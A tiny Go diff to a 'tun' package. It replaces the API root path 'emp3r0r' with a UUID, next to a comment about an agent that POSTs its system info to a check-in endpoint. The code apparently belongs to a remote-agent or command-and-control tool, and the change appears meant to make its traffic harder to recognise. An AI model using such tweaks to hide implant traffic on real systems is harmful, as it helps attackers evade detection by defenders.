@@ -2,7 +2,7 @@ package tun
 
 const (
 	// WebRoot root path of APIs
-	WebRoot = "emp3r0r"
+	WebRoot = "3276d367-8400-11ec-9ac4-b9d591256de4"
 
 	// CheckInAPI agent send POST to this API to report its system info
 	CheckInAPI = WebRoot + "/checkin"
